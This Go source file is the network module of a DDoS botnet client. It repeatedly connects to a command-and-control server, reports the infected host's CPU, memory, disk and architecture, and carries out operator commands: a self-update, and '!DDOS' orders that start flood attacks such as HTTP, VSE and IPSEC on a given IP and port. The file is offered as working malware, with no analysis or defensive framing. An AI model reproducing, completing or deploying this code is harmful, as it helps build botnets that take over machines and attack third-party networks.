package network

import (
	"bot/lib/attack"
	"bot/lib/modules"
	"bot/lib/utils"
	"bufio"
	"fmt"
	"net"
	"strconv"
	"strings"
)

func InitSocket() net.Conn {
	for {
		sock, err := net.Dial("tcp", fmt.Sprintf("%s:%d", utils.CncAddr, utils.CncPort))

		if err != nil {
			continue
		}

		utils.Debug(fmt.Sprintf("Socket initialized --> %s", sock.RemoteAddr()))

		// CPU|RAM|DISK|ARCH|VERSION
		sock.Write([]byte(fmt.Sprintf("BOTINFO|%d|%d|%s|%s|%s\n", Profile.Cpu, Profile.Mem, Profile.Disk, Profile.Arch, utils.BinVersion)))

		return sock
	}
}

func CncSocket() {
	for {
		socket := InitSocket()

		for {
			data, err := bufio.NewReader(socket).ReadString('\n')

			if err != nil {
				utils.Debug("Fatal: Error when recieve data")
				break
			}

			data = strings.ToUpper(strings.TrimSpace(data))
			if data == "" {
				continue
			}

			utils.Debug(fmt.Sprintf("Recv --> %s", data))
			if !strings.HasPrefix(data, "!") {
				continue
			}

			args := strings.Split(strings.Split(data, "!")[1], " ")

			if args[0] == "UPDATE" {
				go modules.CheckForUpdate()
			}

			// ddos method ip port time thread power
			if args[0] == "DDOS" && len(args) == 7 {
				var m *attack.Method

				switch args[1] {
				case "MOJI":
					m = attack.MOJI()
				case "VSE":
					m = attack.VSE()
				case "IPSEC":
					m = attack.IPSEC()
				case "HEX":
					m = attack.HEX()
				case "FMS":
					m = attack.FMS()
				case "HTTP":
					m = attack.HTTP()
				}

				port, err := strconv.Atoi(args[3])
				time, err := strconv.Atoi(args[4])
				thread, err := strconv.Atoi(args[5])
				power, err := strconv.Atoi(args[6])
				utils.HandleError(err)

				a := attack.NewAttack(args[2], port, thread, power, m, time)
				go a.Run()
			}
		}
	}
}
